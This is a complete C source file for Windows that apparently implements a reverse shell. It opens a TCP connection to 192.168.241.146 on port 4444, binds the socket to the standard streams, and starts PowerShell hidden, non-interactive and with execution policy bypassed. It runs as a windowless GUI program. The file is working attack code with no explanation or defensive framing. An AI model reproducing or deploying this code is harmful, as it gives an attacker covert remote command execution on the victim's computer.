#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int connection;
    WCHAR ip_addr[] = L"192.168.241.146";
    int port = 4444;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    shell = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    InetPton(AF_INET, ip_addr, &shell_addr.sin_addr.s_addr);

    connect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr));

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000100;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
    WCHAR lpCommandLine[] = L"powershell -NoP -NonI -W Hidden -Exec Bypass"; 
    CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
